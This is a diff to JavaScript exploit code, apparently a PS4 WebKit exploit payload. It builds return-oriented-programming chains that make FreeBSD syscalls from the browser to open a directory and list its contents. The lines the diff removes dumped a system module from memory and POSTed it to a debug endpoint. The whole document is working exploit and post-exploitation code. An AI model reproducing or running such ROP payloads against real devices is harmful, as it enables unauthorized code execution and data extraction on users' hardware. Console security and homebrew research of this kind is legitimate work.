@@ -162,61 +162,106 @@
 
         storage.set_initial_addr(rop_buf_addr.add(0x10000 * 4))
 
+	debug_log("Directory List for: " + currentDir)
 	debug_log("\r")
 
-	debug_log("Starting ROP Chain...")
-	debug_log("\r")
-        debug_log("Virtual Table Address: 0x" + vtable_ptr.toString(16))
-        debug_log("WebKit Module Base Address: 0x" + webkit_base_addr.toString(16))
-        debug_log("ROP Buffer Address: 0x" + rop_buf_addr.toString(16))
-	debug_log("\r")
-
-	// Get the module's base address
-
-	var infoBuffer 	= storage.alloc(0x1A8)
+	// First open the directory via FreeBSD syscall #005
 	var retBuffer 	= storage.alloc(0x4)
+	var dirPath 	= storage.alloc(0x255)
 
-	write32(infoBuffer, 0x1A8)
+	write_str(dirPath, currentDir)
 
-	var rop = new RopChain();
+	var r = new RopChain()
+	r.syscall(5, dirPath, 0, 0);
+	r.add('pop rdi')
+	r.add(retBuffer)
+	r.add('mov qword ptr [rdi], rax')
 
-	rop.syscall(608, 0xc, 0, infoBuffer);
+	r.execute()
 
-	rop.add('pop rdi')
-	rop.add(retBuffer)
-	rop.add('mov qword ptr [rdi], rax')
+	var fileDir = read32(retBuffer)
 
-	rop.execute()
+	storage.free(0x255 + 0x4)
 
-	var info = read64(infoBuffer.add(0x110))
-		
-	debug_log('Base:  0x' + info.toString(16))
-	debug_log('\r')
+	// If directory exists, get data entities via FreeBSD syscall #272
+	if(fileDir == 2)
+		debug_log("This directory either does not exist or we don't have permission to read here")
+	else
+	{
+		retBuffer = storage.alloc(0x4)
+		dataBuffer = storage.alloc(0x1000)
 
-	storage.free(0x1A8 + 0x4);
+		// Zero our buffer
+		for(var i = 0; i < 0x1000; i += 4)
+			write32(dataBuffer.add(i), 0x00);
 
-	// Dump the module
+		r = new RopChain()
+		r.syscall(272, fileDir, dataBuffer, 0x1000)
+		r.add('pop rdi')
+		r.add(retBuffer)
+		r.add('mov qword ptr [rdi], rax')
 
-	cbuf[0x1E] = 0x4000;
+		r.execute()
 
-	cbuf[0x14] = info.getLowBitsUnsigned()
-	cbuf[0x15] = info.getHighBitsUnsigned()
+		var dataEnts = read32(retBuffer)
+		storage.free(0x1000 + 0x4)
 
-	var moduleBuffer = rop_buf
+		// Parse the data entities and display them
+		var files = [];
 
-	debug_log("Dumping module...")
+		for(var i = 0; i < 0x1000;)
+		{
+			var reclen = read16(dataBuffer.add(i + 4));
+			if(reclen == 0)
+				break;
 
-	$.ajax({
-		url: '/debug/bin/libSceSysmodule.bin',
-		type: 'POST',
-		contentType: 'application/octet-stream',
-		data: moduleBuffer,
-		processData: false,
-		async: false
-	});
+			var type = read8(dataBuffer.add(i + 6));
+			var name = read_str(dataBuffer.add(i + 8));
 
+			files.push({type: type, name: name});
+
+			i += reclen;
+		}
+
+		// Display directory contents
+		for(var i = 0; i < files.length; i++)
+		{
+			// If file is of type 0, it's an unknown file type, highlight red
+			if(files[i]['type'] == 0)
+				debug_log("\033[1;31m[DT_UNK]\t" + files[i]['name'] + "\033[0;0m")
+
+			// If file is of type 1, it's a FIFO pipe, highlight yellow
+                        if(files[i]['type'] == 1)
+                                debug_log("\033[1;33m[DT_FIF]\t" + files[i]['name'] + "\033[0;0m")
+
+			// If file is of type 2, it's a character device file type, highlight magenta
+                        if(files[i]['type'] == 2)
+                                debug_log("\033[1;35m[DT_CHR]\t" + files[i]['name'] + "\033[0;0m")
+
+			// If file is of type 4, it's a directory, highlight blue
+			if(files[i]['type'] == 4)
+				debug_log("\033[1;34m[DT_DIR]\t" + files[i]['name'] + "\033[0;0m")
+
+			// If file is of type 6, it's a block device file type, highlight cyan
+                        if(files[i]['type'] == 6)
+                                debug_log("\033[1;36m[DT_BLK]\t" + files[i]['name'] + "\033[0;0m")
+
+			// If file is of type 8, it's a regular file type, do not highlight
+                        if(files[i]['type'] == 8)
+                                debug_log("[DT_REG]\t" + files[i]['name'])
+
+			// If file is of type 10, it's a link, highlight green
+                        if(files[i]['type'] == 10)
+                                debug_log("\033[1;32m[DT_LNK]\t" + files[i]['name'] + "\033[0;0m")
+
+			// If file is of type 12, it's a *nix domain socket, highlight magenta
+                        if(files[i]['type'] == 12)
+                                debug_log("\033[1;35m[DT_SCK]\t" + files[i]['name'] + "\033[0;0m")
+		}
+	}
     } catch (ex) {
         document.write("<h1>Error: " + ex + "</h1>");
         debug_log("!! ERROR: " + ex);
     }
 </script>
+
